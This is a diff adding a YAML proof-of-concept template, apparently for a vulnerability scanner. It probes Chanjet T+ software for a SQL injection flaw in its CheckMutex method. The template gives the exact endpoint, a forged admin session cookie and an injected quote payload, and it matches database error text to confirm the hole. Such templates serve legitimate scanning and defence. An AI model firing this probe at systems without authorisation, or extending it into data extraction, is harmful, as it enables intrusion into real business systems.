@@ -1,0 +1,23 @@
+id: poc-yaml-chanjet-tplus-checkmutex-sqli
+info:
+  name: 畅捷通 Tplus CheckMutex 功能存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 畅捷通T+
+requests:
+- method: POST
+  path: /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex
+  headers:
+    Content-Type: text/plain
+    Cookie: ASP.NET_SessionId=; sid=admin; HOST=null;
+  data: '{"accNum": "1''", "functionTag": "SYS0104", "url": ""}
+
+    '
+  expression: 'status_code == 200 &&  contains(body, "order by begintime")
+
+    && contains(body, "引号不完整") && !contains(body, "<")
+
+    '
+variables: {}
+transport: http
